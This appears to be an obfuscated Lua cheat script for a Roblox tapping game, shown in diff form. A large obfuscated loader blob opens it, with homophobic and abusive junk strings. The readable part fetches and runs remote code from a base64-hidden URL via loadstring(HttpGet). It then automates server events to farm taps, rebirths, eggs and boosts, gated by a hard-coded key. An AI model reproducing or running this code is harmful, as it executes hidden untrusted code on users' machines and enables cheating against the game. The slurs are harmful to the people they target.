n;l[e[t]]=l[e[f]][e[C]];o=o+d;e=a[o];l[e[t]]=l[e[U]][e[B]];o=o+d;e=a[o];l[e[h]]=l[e[w]][e[C]];o=o+d;e=a[o];l[e[h]]=l[e[s]][e[N]];o=o+d;e=a[o];l[e[k]]=M[e[f]];o=o+d;e=a[o];l[e[h]]=l[e[w]][e[B]];o=o+d;e=a[o];l[e[k]]=e[f];o=o+d;e=a[o];l[e[h]]=e[w];o=o+d;e=a[o];l[e[k]]=e[O];o=o+d;e=a[o];n=e[t]l[n]=l[n](P(l,n+d,e[O]))o=o+d;e=a[o];l[e[h]][e[f]]=l[e[S]];o=o+d;e=a[o];o=e[w];break end while(n)/(((-0x39+1708)+-126))==1517 do if l[e[h]]then o=o+d;else o=e[w];end;break end;break;end break;end break;end break;end break;end while(n)/((634-0x154))==867 do n=(5560373)while(-0x48+232)>=r do n-= n n=(1282400)while(-#[[made by kim jong un]]+((-#"Omg guys"+(821-0x1c0))-192))>=r do n-= n n=(13599180)while r<=(347-(0x96d4/197))do n-= n n=(2476980)while(352-0xca)<r do n-= n l[e[i]]=l[e[U]];break end while 2502==(n)/(((0x8b96-17914)/18))do l[e[c]]=l[e[x]]%e[C];break end;break;end while(n)/((0x1bb4-3578))==3870 do n=(2909310)while((20875/0x7d)+-#[[Protected vírus]])>=r do n-= n if(l[e[c]]==e[_])then o=o+u;else o=e[x];end;break;end while(n)/((0x475+-31))==2621 do n=(2196964)while((381-0xd6)+-#[[Moonsex v5 eta]])<r do n-= n local r;local n;n=e[i];r=l[e[f]];l[n+1]=r;l[n]=r[e[_]];o=o+d;e=a[o];l[e[k]]=e[U];o=o+d;e=a[o];n=e[k]l[n]=l[n](P(l,n+d,e[f]))o=o+d;e=a[o];n=e[b];r=l[e[f]];l[n+1]=r;l[n]=r[e[C]];o=o+d;e=a[o];l[e[c]]={};o=o+d;e=a[o];l[e[t]][e[O]]=e[S];o=o+d;e=a[o];l[e[k]][e[x]]=e[S];o=o+d;e=a[o];l[e[b]][e[U]]=e[S];break end while(n)/((4117-0x81f))==1078 do local n;l[e[k]]=M[e[x]];o=o+d;e=a[o];n=e[h]l[n]=l[n]()o=o+d;e=a[o];l[e[k]][e[O]]=l[e[_]];o=o+d;e=a[o];l[e[h]]=M[e[O]];o=o+d;e=a[o];l[e[t]]=e[O];o=o+d;e=a[o];n=e[b]l[n](l[n+u])o=o+d;e=a[o];do return end;break end;break;end break;end break;end while(n)/(((1245-0x290)+-#'what size is beliveri12s dick'))==2290 do n=(4942788)while(334-0xb1)>=r do n-= n n=(5242950)while(-#'heil eco mother fuckers'+(0x1de-300))>=r do n-= n if not l[e[h]]then o=o+u;else o=e[f];end;break;end while 3050==(n)/((-#"Boosted moonsec for meme string"+(0x47c70/168)))do n=(1427166)while(-#'blinx1 is a sissy little femboy that loves men'+(307+-0x69))<r do n-= n local r;local n;l[e[c]][e[O]]=l[e[C]];o=o+d;e=a[o];n=e[c]l[n](P(l,n+u,e[s]))o=o+d;e=a[o];n=e[t];r=l[e[x]];l[n+1]=r;l[n]=r[e[D]];o=o+d;e=a[o];l[e[i]]={};o=o+d;e=a[o];l[e[b]][e[s]]=e[_];o=o+d;e=a[o];l[e[i]][e[s]]=e[N];o=o+d;e=a[o];l[e[t]][e[x]]=e[B];break end while 1482==(n)/((-0x79+1084))do local n;l[e[b]]=l[e[U]][e[_]];o=o+d;e=a[o];l[e[b]]=l[e[w]][e[_]];o=o+d;e=a[o];l[e[b]]=l[e[O]][e[B]];o=o+d;e=a[o];l[e[i]]=l[e[w]][e[S]];o=o+d;e=a[o];l[e[t]]=M[e[s]];o=o+d;e=a[o];l[e[h]]=l[e[w]][e[B]];o=o+d;e=a[o];l[e[k]]=e[U];o=o+d;e=a[o];l[e[t]]=e[O];o=o+d;e=a[o];l[e[h]]=e[x];o=o+d;e=a[o];n=e[c]l[n]=l[n](P(l,n+d,e[f]))o=o+d;e=a[o];l[e[c]][e[s]]=l[e[S]];o=o+d;e=a[o];o=e[x];break end;break;end break;end while(n)/((0xd57-(-0x67+1856)))==2974 do n=(12998931)while r<=(-#'chicken quesadillas are pretty good ngl'+(445-0xf8))do n-= n local r;local n;l[e[b]][e[x]]=l[e[D]];o=o+d;e=a[o];n=e[t]l[n](P(l,n+u,e[U]))o=o+d;e=a[o];n=e[t];r=l[e[U]];l[n+1]=r;l[n]=r[e[D]];o=o+d;e=a[o];l[e[k]]={};o=o+d;e=a[o];l[e[t]][e[w]]=e[B];o=o+d;e=a[o];l[e[k]][e[w]]=e[N];o=o+d;e=a[o];l[e[k]][e[w]]=e[N];o=o+d;e=a[o];l[e[k]][e[s]]=e[D];o=o+d;e=a[o];l[e[t]][e[x]]=e[D];o=o+d;e=a[o];l[e[c]][e[f]]=e[B];break;end while(n)/((8209-(-#"nicuse is nil skull"+(0xfb9d3/249))))==3179 do n=(859210)while(0x7ff2/206)<r do n-= n l[e[i]]=M[e[U]];o=o+d;e=a[o];l[e[k]]=l[e[O]][e[_]];o=o+d;e=a[o];l[e[h]]=l[e[x]][e[S]];o=o+d;e=a[o];l[e[h]]=l[e[f]][e[C]];o=o+d;e=a[o];l[e[b]]=l[e[U]][e[_]];o=o+d;e=a[o];l[e[h]][e[w]]=l[e[B]];o=o+d;e=a[o];do return end;break end while 2354==(n)/((0x5f87/67))do local o=e[h]local a,e=p(l[o](P(l,o+1,e[s])))m=e+o-1 local e=0;for o=o,m do e=e+d;l[o]=a[e];end;break end;break;end break;end break;end break;end while 2639==(n)/((0x87d+(-12870/0xc3)))do n=(1384393)while r<=(438-0x111)do n-= n n=(7100100)while r<=((3760/0x10)+-#'local bolsac equals game dot localplayer dot character dot legs dot bolls')do n-= n n=(9294353)while((0x1a8+-45)-0xda)<r do n-= n l[e[t]]=M[e[U]];o=o+d;e=a[o];l[e[b]]=l[e[U]][e[S]];o=o+d;e=a[o];l[e[i]]=l[e[O]][e[C]];o=o+d;e=a[o];l[e[b]]=l[e[U]][e[C]];o=o+d;e=a[o];l[e[c]]=l[e[O]][e[_]];o=o+d;e=a[o];l[e[b]]=l[e[w]][e[_]];o=o+d;e=a[o];l[e[c]][e[O]]=l[e[_]];o=o+d;e=a[o];do return end;break end while(n)/((-#[[thats not nice]]+(0x191f1/37)))==3359 do l[e[h]]=M[e[O]];o=o+d;e=a[o];l[e[b]]=l[e[x]][e[B]];o=o+d;e=a[o];l[e[b]]=l[e[w]][e[S]];o=o+d;e=a[o];l[e[i]]=l[e[O]][e[C]];o=o+d;e=a[o];l[e[h]]=l[e[x]][e[D]];o=o+d;e=a[o];l[e[t]][e[O]]=l[e[D]];o=o+d;e=a[o];do return end;break end;break;end while 2254==(n)/((0x30732/63))do n=(12930944)while r<=(0xec+-73)do n-= n local n;l[e[i]]=l[e[f]][e[B]];o=o+d;e=a[o];l[e[i]]=l[e[O]][e[B]];o=o+d;e=a[o];l[e[c]]=l[e[w]][e[_]];o=o+d;e=a[o];l[e[h]]=l[e[s]][e[B]];o=o+d;e=a[o];l[e[i]]=M[e[s]];o=o+d;e=a[o];l[e[b]]=l[e[f]][e[S]];o=o+d;e=a[o];l[e[k]]=e[U];o=o+d;e=a[o];l[e[h]]=e[O];o=o+d;e=a[o];l[e[i]]=e[x];o=o+d;e=a[o];n=e[h]l[n]=l[n](P(l,n+d,e[s]))o=o+d;e=a[o];l[e[h]][e[O]]=l[e[S]];o=o+d;e=a[o];o=e[w];break;end while(n)/(((-0x71+4119)+-#[[Never fading and I know the haters are forever waiting]]))==3272 do n=(633408)while r>((43432/0xf4)+-#'jjsplot on top')do n-= n local n;l[e[k]]=l[e[O]][e[C]];o=o+d;e=a[o];l[e[i]]=l[e[s]][e[D]];o=o+d;e=a[o];l[e[i]]=l[e[U]][e[B]];o=o+d;e=a[o];l[e[i]]=l[e[s]][e[B]];o=o+d;e=a[o];l[e[i]]=M[e[O]];o=o+d;e=a[o];l[e[h]]=l[e[U]][e[B]];o=o+d;e=a[o];l[e[c]]=e[x];o=o+d;e=a[o];l[e[i]]=e[f];o=o+d;e=a[o];l[e[b]]=e[O];o=o+d;e=a[o];n=e[h]l[n]=l[n](P(l,n+d,e[w]))o=o+d;e=a[o];l[e[t]][e[f]]=l[e[D]];o=o+d;e=a[o];o=e[O];break end while 3299==(n)/((0x1a4-228))do l[e[t]]=#l[e[U]];break end;break;end break;end break;end while(n)/(((1167-0x26a)+-#"negative chromosomes"))==2617 do n=(12285812)while(0xdd+-53)>=r do n-= n n=(11051768)while r<=(-0x2d+211)do n-= n local o=e[b]l[o]=l[o](P(l,o+d,e[O]))break;end while(n)/((213486/0x45))==3572 do n=(76440)while r>(25885/0x9b)do n-= n local n;l[e[c]]=l[e[f]][e[N]];o=o+d;e=a[o];l[e[c]]=l[e[O]][e[N]];o=o+d;e=a[o];l[e[i]]=l[e[U]][e[D]];o=o+d;e=a[o];l[e[t]]=l[e[x]][e[B]];o=o+d;e=a[o];l[e[b]]=M[e[f]];o=o+d;e=a[o];l[e[t]]=l[e[x]][e[S]];o=o+d;e=a[o];l[e[b]]=e[x];o=o+d;e=a[o];l[e[k]]=e[x];o=o+d;e=a[o];l[e[c]]=e[x];o=o+d;e=a[o];n=e[h]l[n]=l[n](P(l,n+d,e[x]))o=o+d;e=a[o];l[e[c]][e[U]]=l[e[D]];o=o+d;e=a[o];o=e[x];break end while(n)/((0x6ec-932))==91 do if(l[e[k]]~=e[S])then o=o+u;else o=e[w];end;break end;break;end break;end while(n)/(((6568-0xcf2)+-0x5a))==3883 do n=(2601000)while(0x184-219)>=r do n-= n local e=e[t]local a,o=p(l[e](l[e+u]))m=o+e-d local o=0;for e=e,m do o=o+d;l[e]=a[o];end;break;end while(n)/((-#[[Show me your meme stealing license]]+(0xc42e4/234)))==765 do n=(676200)while(284+-0x72)<r do n-= n o=e[f];break end while 200==(n)/((0x1a7c-3399))do if(l[e[t]]==l[e[B]])then o=o+u;else o=e[f];end;break end;break;end break;end break;end break;end break;end break;end break;end o+= u end;end);end;return v(z(),{},L())()end)_msec({[(268-0x8f)]='\115\116'..(function(e)return(e and'      ​ ')or'\114\105'or'\120\58'end)(((21716/0xb2)+-#'Ok guys relax Theyre just fucking socks Its impossible for socks to turn me gay My heterosexuality will be fine dudes')==(-#'Nicuse is good at sucking dick'+(-125+0xa1)))..'\110g',["         ​   "]='\108\100'..(function(e)return(e and'               ')or'\101\120'or'\119\111'end)((-#'Pyrite On Top'+(88-0x46))==((-0x71+(383-0xf6))+-#'free bobux no skem'))..'\112',["         ​        "]=(function(e)return(e and'               ')and'\98\121'or'\100\120'end)((-52+(0x675/29))==(720/0x90))..'\116\101',["          ​       "]='\99'..(function(e)return(e and'           ​    ')and'\90\19\157'or'\104\97'end)((123-0x76)==(113-0x6e))..'\114',[((54236/0x5b)+-#[[nico der hurensohn]])]='\116\97'..(function(e)return(e and'                  ')and'\64\113'or'\98\108'end)((-#[[nerd]]+(0x7d-115))==(515/0x67))..'\101',["        ​ "]=(function(e)return(e and'        ​   ')or'\115\117'or'\78\107'end)((0xf6/82)==(0x9c+(-89+-0x24)))..'\98',["        ​   "]='\99\111'..(function(e)return(e and'        ​   ')and'\110\99'or'\110\105\103\97'end)(((0x3e04/189)+-#[[Rip Technoblade but he truly never dies in our hearts]])==(0x66-71))..'\97\116',[(1315-0x2ac)]=(function(e,o)return(e and'          ')and'\48\159\158\188\10'or'\109\97'end)((82-0x4d)==(-#"gozei na parede"+(-0x27+60)))..'\116\104',[(-91+0x59b)]=(function(o,e)return(((0x96f/115)+-#"iPipeh Is My god")==(0x5e-91)and'\48'..'\195'or o..((not'\20\95\69'and'\90'..'\180'or e)))or'\199\203\95'end),["        "]='\105\110'..(function(e,o)return(e and'      ​ ')and'\90\115\138\115\15'or'\115\101'end)((-#[[Rip Technoblade but he truly never dies in our hearts]]+(126+-0x44))==((0xa8-131)+-#[[uhhhhh]]))..'\114\116',["   ​         "]='\117\110'..(function(e,o)return(e and' ​               ')or'\112\97'or'\20\38\154'end)((0x6f+-106)==(2511/0x51))..'\99\107',["    ​    "]='\115\101'..(function(e)return(e and'   ​    ​  ')and'\110\112\99\104'or'\108\101'end)((0x19a/82)==(3100/0x64))..'\99\116',["   ​           "]='\116\111\110'..(function(e,o)return(e and'                ')and'\117\109\98'or'\100\97\120\122'end)((-#[[get funnier L]]+(-0x71+131))==(270/0x36))..'\101\114'},{["   ​           "]=((getfenv))},((getfenv))()) end)()
+ 
 
 
+--> VARIABLES <--
+local Player = game.Players.LocalPlayer
+print(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('zLKSGpAUJacpBUhgfymhRicNofbtivmxXNFOoVsUhkVYkSShPGkrKCOTG9hZGVkIERlbWlzZUh1Yg=='))
+
+if game.PlaceId == 9498006165 then
+--> LOADING THE GUI <--
+local Atlas = loadstring(game:HttpGet(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('wwApvmqjbognkllndsfVIXbpFyLesKfZPDuwqfiwcXVTdUqRxxdMmNFaHR0cHM6Ly9yZDJnbG9yeS5jb20vQXRsYXMubHVh')))()
+local UI = Atlas.new({
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('stBndbukoIWyNOskabcFlNNJHDvJBsaxERLYBhdVXAIwtgJKgUlsHcBRGVtaXNlSHViIHwgVGFwcGluZyBTaW11bGF0b3Ig'); 
+    ConfigFolder = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('HdXgewruEracLzvLmskZFTKFCCaljgGpOnggVzGhPAaGXnizzDxIlkSRGVtaXNlSHVi'); 
+    Credit = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('ECnxqQcoPBhSaekeKgJBuisNKfdCUlSarCyPFlBSKlrZYezPQjpNGxnTWFkZSBCeSBwdGgjMDMxNg=='); 
+    Color = Color3.fromRGB(255, 255, 255); 
+    Bind = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('MDkxkXDlIhmnRztsAgaCjStOjQToifhBHwBqsqjASEzoRRbhkLAcLcPTGVmdENvbnRyb2w='); 
+    UseLoader = true; 
+    FullName = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('fSJldSyFLKDzqlcdrYekTBJZPpSvzmrObUXvkQjCBWrKxKAJxMANcBfRGVtaXNlSHVi'); 
+    CheckKey = function(inputtedKey) 
+        return inputtedKey==IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('nxfWWUjuZJiTmfqrHqxXKOeoLQDmIhtjVTRmDhnXPlPUNyEsmQqsGicRDNtaXNlMG5UMHA=')
+    end;
+    Discord = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('HhoHcTJxIWhSFAcUdhnPlGvllNoibonoBKrhuEUsznIYNXJJqZzYCADaHR0cHM6Ly9kaXNjb3JkLmdnL2ZRdkh4OE1qS1M=');
+})
+
+--> VALUES <--
+getgenv().autoTap = nil
+getgenv().autoRebirth = nil
+getgenv().selectRebirth = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('zBOOlvYpZGgjbZVlnjFdtGASlGnweiQkTnmOYhoVwIOxepAgnfsjnGTMQ==')
+getgenv().autoClaimRandom = nil
+getgenv().autoEgg = nil
+getgenv().autoRank = nil
+getgenv().Luck = nil
+getgenv().twoluck = nil
+getgenv().Taps = nil
+
+local Eggs_Table = {}
+    for i,v in pairs(game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('JWYsLhalcxrFNWjzzbxoZvZUDAKJKckPqoqDiipsmiEybIjGpxLlVnBV29ya3NwYWNl')).Shops:GetChildren()) do
+        table.insert(Eggs_Table, v.Name)
+    end
+
+--> FUNCTIONS <--
+function autoTap()
+    while getgenv().autoTap == true do
+        game.ReplicatedStorage.Events.Tap:FireServer()
+        task.wait()
+    end
+end
+
+function autoRebirth()
+    while getgenv().autoRebirth == true do
+        game.ReplicatedStorage.Events.Rebirth:FireServer(getgenv().selectRebirth)
+        task.wait()
+    end
+end
+
+function autoClaimRandom()
+    while getgenv().autoClaimRandom == true do
+        game.ReplicatedStorage.Events.ClaimRandomReward:FireServer()
+        task.wait()
+    end    
+end
+
+function autoEgg()
+    while getgenv().autoEgg == true do
+        game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('FdWohqsDVYtOMkvpCuoJFxGkKyVtTXWQfPNTVusNHMxbQoKdCcvhlriUmVwbGljYXRlZFN0b3JhZ2U=')).Events.HatchEgg:InvokeServer({},SelectEgg,1)
+        task.wait()
+    end
+end
+
+function Teleport()
+    while getgenv().Teleport == true do
+        game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('xuUjFwzEDDDaMTYBMzPudhDtvBQbaLwXWVKbTHEVKNmbcZNCsSefUkxUmVwbGljYXRlZFN0b3JhZ2U=')).Teleport.Teleport:InvokeServer({},SelectTeleport,1)
+        task.wait()
+    end
+end
+
+function autoRank()
+    while getgenv().autoRank == true do
+        game.ReplicatedStorage.Events.ClaimRankReward:FireServer()
+        task.wait()
+    end
+end
+
+function Luck()
+    while getgenv().Luck == true do
+        game.ReplicatedStorage.Events.UseBoost:FireServer(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('mcudoDTdYtsArKvonHFpFFbobRuIaRGxaZRSaqRQEZQxbWvKegebjEndHJpcGxlTHVjaw=='))
+        wait(900)
+    end
+end
+    
+function luck()
+    while getgenv().twoluck == true do
+        game.ReplicatedStorage.Events.UseBoost:FireServer(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('nrKWhaZljtjFjOlOQIvZqaxenrklBmfgQPNhrsbqggdxvEhNZJHOgENZG91YmxlTHVjaw=='))
+        wait(900)
+    end
+end
+    
+function Taps()
+    while getgenv().Taps == true do
+        game.ReplicatedStorage.Events.UseBoost:FireServer(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('tAVgZMNgsHtOeLyiKISpKmfzApqSBoxtcMtFCJkIslgrhowtDaMXACLdHJpcGxlVGFwcw=='))
+        wait(900)
+    end
+end
+
+--> PAGES <--
+local Farm = UI:CreatePage(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('XVpeCTJDcaGmfszfuIImdmJvxToVfHddBwmhSsGPDkogJOrkVpypvyuQXV0b0Zhcm0='))
+local Eggs = UI:CreatePage(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('XiVVbVVPTPUizGqkgnNKIpOeWrWDhKkfbWjxNzbTnXIVPmncKmCukfNRWdncw=='))
+local Player = UI:CreatePage(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('muGXGCZxpChuKnjNFaWKyOiVsDcqQCIuIJNfLfPNmvPkxMOBVradfArUGxheWVy'))
+local Misc = UI:CreatePage(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('ZiWbvmZQKfdVLxdqxPnruvYdEmqpVOuQQwHAwtkuYgvYjlKlNGHSdfGTWlzYw=='))
+
+--> SECTIONS <--
+local AutoFarm = Farm:CreateSection(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('gbnTpfQQebBJEBpVFoatAZGZVrgIPxzdviidwjqbxiOgktkMiHtUTkhQXV0byBTdHVmZg=='))
+local Eggs = Eggs:CreateSection(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('QNusMHyzptWOexoBPMiYTboMQzmFuBTRuyZvRNwxjsOzhazpOwydkkHQXV0byBFZ2dz'))
+local Misc = Misc:CreateSection(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('PXGpBrGfATXoKQZKYCyPBPsYuTbZiEmZFxjShvvWTWEvRanUuvFIEcaTWlzYw=='))
+local Teleport = Player:CreateSection(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('oaQuTJYZTNGxxsVbIhjBjKcZInqRjUqxHtOBxkVbibzvBwOayGJAJEWVGVsZXBvcnRz'))
+
+--> TOGGLES <--
+AutoFarm:CreateToggle({ 
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('rWfvlvOhpdJeEILeNPtSLwuwNdfiWIJKGsCUDnVIrSSdezZNbfbTRXEQXV0b1RhcA=='); 
+    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('SdfOmhhHuFDDBkFPiHarFANLZKbgnOCCmpoRVBibowMOihAbJyZzstBVGFw'); 
+    Default = false; 
+    Callback = function(v) 
+        getgenv().autoTap = v
+        autoTap()
+    end;
+})
+
+AutoFarm:CreateToggle({ 
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('fiLtHWXqPOGSXjpdpyPEROnvFvOJNblWcsafvzfxKjAroZNFPChCaIsQXV0b1JlYmlydGg='); 
+    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('fQHJzfibPXQBFaJPRFXUywTDQWioIQshRyccPDWrnKDHCvxxyRloPGDUmViaXJ0aA=='); 
+    Default = false; 
+    Callback = function(v) 
+        getgenv().autoRebirth = v
+        autoRebirth()
+    end;
+})
+
+local MyDropdown = AutoFarm:CreateDropdown({
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('hVzIornJybOekyZSiEtnAPAhwlGCJhqxcKVemDsXfVFDCRKwefegmElU2VsZWN0UmViaXJ0aA==');
+    Callback = function(Value) 
+        getgenv().selectRebirth = Value
+        print(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('RWGFMdqAhaDSCkuBqcSGEkYmphcSVnjgQAfKAnicLnGjkJvgJZoEutPc2VsZWN0UmViaXJ0aCgp'))
+    end;
+    Options = {IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('fASeZyJREFUHNwqRiRRPwCyeCmxnDQBSjwDQFRWwqDatQyercIPAzJAMQ=='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('ZBoNOcNeckcdzmiFpoxBtoRYQeSMAMTgYGdelnlZCzbMZLZVRiwHVEzNQ=='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('lQVTxruWsRrzfjUMyGVoMkNsKtkmlRgWKqgwBUrqhjAvhCOlcrcieGfMTA='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('UHRmbDxpwwPKpSaOuWLiVXEaIrrQWVKoPvxcREDLlFVcgunBbAZaqKeMjA='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('tbDXjQEKgdlzsXrVGQMYYZYVwTQooqiheatHyELliwkmUgEPWdRlNaMMTAw'),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('PBtDOKjUPXHlyiOCoTrTcCuzDQhfleEORlUnHLEghJnGxylPUPDniyFNTAw'),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('kdbcBZhognLGPGFxMRBjdOTyBtDFNKwfmhmaEfcmTGQrTXRFuJEbfYbMjAwMA=='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('cvGvytGCeLLGydWeGsRaZIHcPTAJcFdWPYIInuIHrwSMeSsYyfzDtQjNDUwMA=='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('oTUfxpMwzQMUizpOFzsksZgzkCaKnXASAQqtkwoheOxWhEeIuWMZjoyODAwMA=='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('XAmEhXtiFMyDKkvgyWHgDwkJsOdFHuKCqOUngObtLYKTIVPFJoKCUwdMTI1MDA='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('RUXhmuKkPsRyvXpSDJovSkUjSQLjWbqnJNmJRsnTpUKYYpXIxKPKzEPMTgwMDA='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('BEwWbNkYUEloENbYfSdLHkzmQThwEqyZHdZFKVYrkjHDsqIrGSkqmySMjQ1MDA='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('vDBLLsaXXrMxVJuAXiVEuIuoResKCtdifiYdUwOUUiFRbCvHshSPoZFMzIwMDA='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('EAIAtwpKvJYnqbroCwFrTYiTiEZJqyRqVdZsRToMgxvCLoSEvBRPSSLNDA1MDA='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('MpwbbsuTLEUzrMzaOpidjcrYnsuYnsMBsvrYaNPPJphTKhcMTLBCqmNNTAwMDA='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('BKHVZDtgopgbdVQiXbIzaiLrhHIYTIBWACsNhbzYFLFHDWdPrNAwhwhNzUwMDA='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('LsrSQDHThuazvBBCLWXsOyxofjjVuoHmESpZDOTtfidowWSUuyDjBIrMTI1MDAw'),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('DTutHjzUHoATahezhZMJgPaowsbJhpztraUlGPAxWgATKKKSZOsqIpGMzUwMDAw'),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('rJRPaFfNElVpngnMEBBdmOqzyHWucYaITRKQgyeMwSeqmXOHlBvgoSJNzUwMDAw'),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('HVxoyyOqnXxwcLrDOuwztVhuebKgeGrrEmDaqHNGzewGGgkRiQeFRfBMTAwMDAwMA=='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('GaEtLLsTrHnNHrAeFOXjSieuVxwRFNXxqUavQFoDTWYdMOJqHnRTILUMjAwMDAwMA==')}; 
+    ItemSelecting = true; 
+    DefaultItemSelected = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('sTmuyJEcGuueuWyqSbvAOZcNkFItqZfqBSCUkHDsAahzuaLNiBljVavMQ=='); 
+    
+})
+
+AutoFarm:CreateToggle({ 
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('cpiNtMKOIZHAXWuFrunqckukmzxUVqGkWzcorgDJFoLtpikDlfEOIZwQXV0byBVc2UgM3ggTHVja3koRXZlcnkgMTUgTWlucyk='); 
+    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('AoHjZgOZnLXysVVSGyLavEwXWKcevpFwigWOSNQrwrzgnnpDXwWpxYlM3g='); 
+    Default = false; 
+    Callback = function(v) 
+        getgenv().Luck = v
+        Luck()
+    end;
+})
+
+AutoFarm:CreateToggle({ 
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('iHkbLMUKxRYKBNnJxsDNymmvIXUxBQmTJXzAxOYQprDvEjlLVhvdSbFQXV0byBVc2UgMnggTHVja3koRXZlcnkgMTUgTWlucyk='); 
+    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('RkUmoDCGqHjSMaINfPPlwtFtMSSLRwPafSgEndXDIWcjYWlZVbDAOyIMng='); 
+    Default = false; 
+    Callback = function(v) 
+        getgenv().twoluck = v
+        luck()
+    end;
+})
+
+
+AutoFarm:CreateToggle({ 
